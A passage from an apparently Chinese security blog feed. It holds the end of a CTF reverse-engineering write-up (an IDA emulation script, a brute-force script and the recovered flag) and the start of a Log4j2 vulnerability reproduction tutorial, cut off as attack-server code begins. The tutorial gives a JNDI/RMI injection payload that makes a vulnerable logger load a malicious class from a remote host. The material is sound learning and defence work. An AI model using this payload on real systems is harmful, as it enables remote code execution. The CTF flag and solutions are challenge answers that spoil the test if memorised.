c[i + <span class="number">16</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c[i + <span class="number">16</span>] = num[a][<span class="number">16</span> + (num[b][i + <span class="number">16</span>] &amp; <span class="number">0xF</span>)]</span><br><span class="line">    num[a] = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invvpshufb</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    c = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> num[b][i] &amp; <span class="number">0x80</span>:</span><br><span class="line">            c[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c[num[b][i] &amp; <span class="number">0xF</span>] = num[a][i]</span><br><span class="line">    <span class="keyword">if</span> num[b][i + <span class="number">16</span>] &amp; <span class="number">0x80</span>:</span><br><span class="line">        c[i + <span class="number">16</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c[<span class="number">16</span> + (num[b][i + <span class="number">16</span>] &amp; <span class="number">0xF</span>)] = num[a][i + <span class="number">16</span>]</span><br><span class="line">    num[a] = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpermd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    c = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        c[i * <span class="number">4</span>] = num[a][num[b][i * <span class="number">4</span>] * <span class="number">4</span>]</span><br><span class="line">        c[i * <span class="number">4</span> + <span class="number">1</span>] = num[a][num[b][i * <span class="number">4</span>] * <span class="number">4</span> + <span class="number">1</span>]</span><br><span class="line">        c[i * <span class="number">4</span> + <span class="number">2</span>] = num[a][num[b][i * <span class="number">4</span>] * <span class="number">4</span> + <span class="number">2</span>]</span><br><span class="line">        c[i * <span class="number">4</span> + <span class="number">3</span>] = num[a][num[b][i * <span class="number">4</span>] * <span class="number">4</span> + <span class="number">3</span>]</span><br><span class="line">        num[a] = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invvpermd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        c[num[b][i * <span class="number">4</span>] * <span class="number">4</span>] = num[a][i * <span class="number">4</span>]</span><br><span class="line">        c[num[b][i * <span class="number">4</span>] * <span class="number">4</span> + <span class="number">1</span>] = num[a][i * <span class="number">4</span> + <span class="number">1</span>]</span><br><span class="line">        c[num[b][i * <span class="number">4</span>] * <span class="number">4</span> + <span class="number">2</span>] = num[a][i * <span class="number">4</span> + <span class="number">2</span>]</span><br><span class="line">        c[num[b][i * <span class="number">4</span>] * <span class="number">4</span> + <span class="number">3</span>] = num[a][i * <span class="number">4</span> + <span class="number">3</span>]</span><br><span class="line">        num[a] = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">op = []</span><br><span class="line">flag =[<span class="number">147</span>, <span class="number">203</span>, <span class="number">231</span>, <span class="number">147</span>, <span class="number">169</span>, <span class="number">129</span>, <span class="number">13</span>, <span class="number">182</span>, <span class="number">216</span>, <span class="number">221</span>, <span class="number">156</span>, <span class="number">127</span>, <span class="number">192</span>, <span class="number">77</span>, <span class="number">205</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">160</span>, <span class="number">159</span>, <span class="number">34</span>, <span class="number">137</span>, <span class="number">239</span></span><br><span class="line">    , <span class="number">84</span>, <span class="number">93</span>, <span class="number">239</span>, <span class="number">0</span>, <span class="number">141</span>, <span class="number">254</span>, <span class="number">94</span>, <span class="number">76</span>, <span class="number">208</span>, <span class="number">236</span>]</span><br><span class="line">num = numpy.uint8([[<span class="number">104</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">123</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">95</span>,</span><br><span class="line">                    <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">103</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">125</span>, <span class="number">0</span>],</span><br><span class="line">                   [</span><br><span class="line">                       <span class="number">240</span>, <span class="number">255</span>, <span class="number">100</span>, <span class="number">38</span>, <span class="number">242</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">238</span>, <span class="number">238</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">136</span>, <span class="number">10</span>, <span class="number">33</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">252</span>, <span class="number">112</span>, <span class="number">229</span>, <span class="number">168</span>,</span><br><span class="line">                       <span class="number">243</span>, <span class="number">245</span></span><br><span class="line">                       , <span class="number">26</span>, <span class="number">212</span>, <span class="number">60</span>, <span class="number">177</span>, <span class="number">12</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">185</span>, <span class="number">27</span>],</span><br><span class="line">                   [</span><br><span class="line">                       <span class="number">13</span>, <span class="number">192</span>, <span class="number">132</span>, <span class="number">197</span>, <span class="number">14</span>, <span class="number">128</span>, <span class="number">80</span>, <span class="number">255</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">29</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">81</span>, <span class="number">155</span>, <span class="number">53</span>, <span class="number">188</span>,</span><br><span class="line">                       <span class="number">213</span>, <span class="number">244</span>, <span class="number">19</span></span><br><span class="line">                       <span class="number">5</span>, <span class="number">196</span>, <span class="number">64</span>, <span class="number">144</span>, <span class="number">7</span>, <span class="number">42</span>, <span class="number">192</span>, <span class="number">45</span>, <span class="number">144</span>],</span><br><span class="line">                   [</span><br><span class="line">                       <span class="number">137</span>, <span class="number">161</span>, <span class="number">62</span>, <span class="number">192</span>, <span class="number">229</span>, <span class="number">20</span>, <span class="number">95</span>, <span class="number">197</span>, <span class="number">95</span>, <span class="number">20</span>, <span class="number">176</span>, <span class="number">208</span>, <span class="number">37</span>, <span class="number">31</span>, <span class="number">232</span>, <span class="number">245</span>, <span class="number">176</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">194</span>, <span class="number">199</span>,</span><br><span class="line">                       <span class="number">160</span>, <span class="number">178</span>,</span><br><span class="line">                       <span class="number">60</span>, <span class="number">94</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">164</span>, <span class="number">152</span>, <span class="number">232</span>, <span class="number">84</span>, <span class="number">11</span>],</span><br><span class="line">                   [</span><br><span class="line">                       <span class="number">51</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">13</span>, <span class="number">100</span>, <span class="number">168</span>, <span class="number">255</span>, <span class="number">143</span>, <span class="number">153</span>, <span class="number">167</span>, <span class="number">148</span>, <span class="number">158</span>, <span class="number">154</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">39</span>, <span class="number">54</span>, <span class="number">214</span>, <span class="number">130</span>, <span class="number">194</span>,</span><br><span class="line">                       <span class="number">109</span>, <span class="number">232</span></span><br><span class="line">                       , <span class="number">170</span>, <span class="number">150</span>, <span class="number">74</span>, <span class="number">101</span>, <span class="number">192</span>, <span class="number">12</span>, <span class="number">55</span>, <span class="number">25</span>, <span class="number">201</span>],</span><br><span class="line">                   [</span><br><span class="line">                       <span class="number">143</span>, <span class="number">33</span>, <span class="number">168</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">166</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">161</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">230</span>, <span class="number">85</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">28</span>, <span class="number">215</span>,</span><br><span class="line">                       <span class="number">185</span>, <span class="number">158</span>, <span class="number">57</span>,</span><br><span class="line">                       <span class="number">96</span>, <span class="number">29</span>, <span class="number">198</span>, <span class="number">145</span>, <span class="number">138</span>, <span class="number">54</span>, <span class="number">139</span>],</span><br><span class="line">                   [<span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">15</span></span><br><span class="line">                    ],</span><br><span class="line">                   [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">ea = <span class="number">0x140001081</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment"># 运行一遍汇编，验证加密过程是否正确，并得到ymm1~ymm7的数据</span></span><br><span class="line">    <span class="keyword">if</span> ea &gt;= <span class="number">0x0140007F17</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    opcode = print_insn_mnem(ea)  <span class="comment"># 得到汇编助记符</span></span><br><span class="line">    opnum1 = <span class="built_in">int</span>(print_operand(ea, <span class="number">0</span>)[-<span class="number">1</span>])  <span class="comment"># 得到第一个操作数的序号（即ymm0取0）</span></span><br><span class="line">    opnum2 = <span class="built_in">int</span>(print_operand(ea, <span class="number">1</span>)[-<span class="number">1</span>])</span><br><span class="line">    opnum3 = <span class="built_in">int</span>(print_operand(ea, <span class="number">2</span>)[-<span class="number">1</span>])</span><br><span class="line">    op.append([opcode, opnum1, opnum2, opnum3])</span><br><span class="line">    <span class="keyword">if</span> opcode == <span class="string">&#x27;vpaddb&#x27;</span>:</span><br><span class="line">        vpaddb(opnum1, opnum3)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="string">&#x27;vpsubb&#x27;</span>:</span><br><span class="line">        vpsubb(opnum1, opnum3)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="string">&#x27;vpxor&#x27;</span>:</span><br><span class="line">        vpxor(opnum1, opnum3)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="string">&#x27;vpshufb&#x27;</span>:</span><br><span class="line">        vpshufb(opnum1, opnum3)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="string">&#x27;vpermd&#x27;</span>:</span><br><span class="line">        vpermd(opnum1, opnum2)</span><br><span class="line">    ea = next_head(ea)</span><br><span class="line"></span><br><span class="line">num[<span class="number">0</span>] = flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> op[::-<span class="number">1</span>]:  <span class="comment"># 倒序解密</span></span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;vpaddb&#x27;</span>:</span><br><span class="line">        vpsubb(i[<span class="number">1</span>], i[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">&#x27;vpsubb&#x27;</span>:</span><br><span class="line">        vpaddb(i[<span class="number">1</span>], i[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">&#x27;vpxor&#x27;</span>:</span><br><span class="line">        vpxor(i[<span class="number">1</span>], i[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">&#x27;vpshufb&#x27;</span>:</span><br><span class="line">        invvpshufb(i[<span class="number">1</span>], i[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> i[<span class="number">0</span>] == <span class="string">&#x27;vpermd&#x27;</span>:</span><br><span class="line">        invvpermd(i[<span class="number">1</span>], i[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num[<span class="number">0</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        print(i, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就是P1umH0师傅的wp，比较巧妙，因为这个题可以看做单字节加密，所以可以挨着爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">real_flag=<span class="string">&quot;hgame&#123;&quot;</span><span class="comment">#绝对正确的前6个字符</span></span><br><span class="line">cur_index=<span class="number">6</span><span class="comment">#当前爆破的位置</span></span><br><span class="line"><span class="keyword">while</span> cur_index&lt;<span class="number">32</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#当前爆破的位置上的字符</span></span><br><span class="line">        real_flag_arr = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag)):<span class="comment">#正确的先复制一下</span></span><br><span class="line">            real_flag_arr[j]=<span class="built_in">ord</span>(real_flag[j])</span><br><span class="line">        real_flag_arr[<span class="built_in">len</span>(real_flag_arr)-<span class="number">1</span>]=<span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>)<span class="comment">#最后一个字符&quot;&#125;&quot;固定</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag_arr)-<span class="number">2</span>,cur_index,-<span class="number">1</span>):<span class="comment">#除了当前爆破的位置，其他位置上都设置为32</span></span><br><span class="line">            real_flag_arr[j]=<span class="number">32</span></span><br><span class="line">        real_flag_arr[cur_index]=i<span class="comment">#设置当前爆破的位置上的字符</span></span><br><span class="line">        real_flag_arr_s=<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> real_flag_arr)<span class="comment">#输入到程序中的字符串</span></span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;D:\\ctfdownloadfiles\\hardasm.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        p.stdin.write(real_flag_arr_s.encode())</span><br><span class="line">        p.stdin.close()</span><br><span class="line">        out = p.stdout.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(out)&gt;cur_index:<span class="comment">#判断程序打印出的0xFF的个数是否增加，增加则说明当前爆破的位置上的字符设置的是正确的</span></span><br><span class="line">            real_flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            cur_index+=<span class="number">1</span></span><br><span class="line">            print(real_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># hgame&#123;r</span></span><br><span class="line"><span class="comment"># hgame&#123;ri</span></span><br><span class="line"><span class="comment"># hgame&#123;rig</span></span><br><span class="line"><span class="comment"># hgame&#123;righ</span></span><br><span class="line"><span class="comment"># hgame&#123;right</span></span><br><span class="line"><span class="comment"># hgame&#123;right_</span></span><br><span class="line"><span class="comment"># hgame&#123;right_y</span></span><br><span class="line"><span class="comment"># hgame&#123;right_yo</span></span><br><span class="line"><span class="comment"># hgame&#123;right_you</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_a</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_as</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_i</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_g</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_go</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_goo</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_good</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_good!</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_good!!</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_good!!&#125;</span></span><br><span class="line"><span class="comment"># hgame&#123;right_your_asm_is_good!!&#125; </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2 漏洞复现</title>
      <link href="2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Log4j2-漏洞复现"><a href="#Log4j2-漏洞复现" class="headerlink" title="Log4j2 漏洞复现"></a>Log4j2 漏洞复现</h1><p>刚入门web安全，简单分析了下之前比较火的Log4j2漏洞，当然肯定有些地方还是没有理解到位的。</p><h2 id="什么是Log4J"><a href="#什么是Log4J" class="headerlink" title="什么是Log4J"></a>什么是Log4J</h2><p>log4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p><p>简单来讲就是记录日志的一个框架，使用比较广，功能比较多，比较方便。</p><p>然后我自己也尝试去用log4j-1.2.17.jar去使用下这个日志打印，但是没能成功，无论怎么配置总是会出现。</p><pre><code>log4j:WARN No appenders could be found for logger (MyTest).log4j:WARN Please initialize the log4j system properly.log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.</code></pre><p>但是对漏洞分析并没什么影响。</p><p>具体配置Log4J环境的文章可以看看这三篇文章，介绍得比较详细。</p><ul><li><a href="https://cloud.tencent.com/developer/article/1455713">Java中Log4J的使用教程</a></li><li><a href="https://blog.csdn.net/EVEcho/article/details/87640356">Intellij IDEA使用log4j输出日志记录完整教程</a></li><li><a href="https://www.jianshu.com/p/ccafda45bcea">Log4j.properties配置详解</a></li></ul><h2 id="Log4j2-原理"><a href="#Log4j2-原理" class="headerlink" title="Log4j2 原理"></a>Log4j2 原理</h2><h3 id="Log4j2的Lookups"><a href="#Log4j2的Lookups" class="headerlink" title="Log4j2的Lookups"></a>Log4j2的Lookups</h3><p>正常我们使用Log4j2打印日志，如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">  String name = <span class="string">&quot;test&quot;</span>;  <span class="comment">//表单接收name字段</span></span><br><span class="line">  logger.info(<span class="string">&quot;&#123;&#125;,登录了&quot;</span>, name); <span class="comment">//logger为log4j</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//test,登录了</span></span><br></pre></td></tr></table></figure><p>但是如果我们将name修改一下，成为{$java:os}，结果就会改变。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">  String name = <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  <span class="comment">//表单接收name字段</span></span><br><span class="line">  logger.info(<span class="string">&quot;&#123;&#125;,登录了&quot;</span>, name); <span class="comment">//logger为log4j</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Windows 7 6.1 Service Pack 1，体系结构：amd64-64,登录了</span></span><br></pre></td></tr></table></figure><p>而照成这一原因就是Log4j2的Lookups功能，也就是查找功能，类似于一个字典，可以根据key来找到value。</p><p>并且提供Jndi Lookup，如下。<br><img src="https://s2.loli.net/2022/02/17/iyNdJKZ6IahGEsO.png"></p><p>更多Lookup，参考官方文档，<a href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</a></p><h3 id="JNDI注入-RMI"><a href="#JNDI注入-RMI" class="headerlink" title="JNDI注入+RMI"></a>JNDI注入+RMI</h3><p>然后我们来看看一个playload：${jndi:rmi:192.168.9.23:1099/remote}，我们需要知道</p><p>为什么playload是这个样子，这实际上这将设计到java安全的知识了，由于没有java经验，在看了很多文章后，只能简单总结下。</p><p><strong>JNDI概念</strong></p><p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p><p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p><p>以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p><p><strong>主要就是JNDI注入+RMI</strong></p><p>先看一段常见JNDI注入+RMI代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndi</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();<span class="comment">//得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri);<span class="comment">//获取指定的远程对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果uri设置成这样，客户端就可能就可能会被攻击，原因是我们加了个rmi(远程方法调用 RMI)，代表可以运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法，所以只要我们设置好服务端的恶意方法，客户端就会去执行他，而这个过程就又设计到了JNDI的LDAP服务等一系列操作。</p><p>而Log4j2漏洞就是利用了其提供了提供Jndi Lookup，而且如果我们能够控制输入的name时，就可以进行利用，简单理一下流程。</p><ul><li>我们控制输入，输入playload：${jndi:rmi:192.168.9.23:1099/remote}</li><li>然后Log4j2打印日志时，使用logger.info(“{}”, name);</li><li>lookup解析jndi，客户端远端调用服务端的恶意方法(实际上这一过程比较复杂，需要对java安全有比较深入的了解)。</li></ul><p>参考文章：<a href="https://www.cnblogs.com/nice0e3/p/13958047.html#jndi%E6%B3%A8%E5%85%A5rmi%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB">Java安全之JNDI注入</a>，<a href="https://blog.csdn.net/hilaryfrank/article/details/121944757?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.queryctrv4&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Log4j2注入漏洞万字剖析-汇总收藏版</a>，<a href="https://zhuanlan.zhihu.com/p/444814529?utm_source=wechat_session&utm_medium=social&utm_oi=911728743985344512&utm_campaign=shareopn">Log4j2原理</a><br>特别是第二篇文章，详细的介绍了LDAP方式的利用过程及原理，对过程非常详细，还有图片流程。</p><h2 id="Log4j2-复现"><a href="#Log4j2-复现" class="headerlink" title="Log4j2 复现"></a>Log4j2 复现</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>我这里是直接下载了网上找的一个demo，相当于已经配好了环境，只是需要更改下jdk版本，jdk环境为jdk1.8.0_91。</p><p>然后来看看demo的代码。</p><p>攻击服务端，主要就是利用Reference包装了一个恶意类，然后注册到了我们指定的远端服务器，也就是127.0.0.1:1099。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 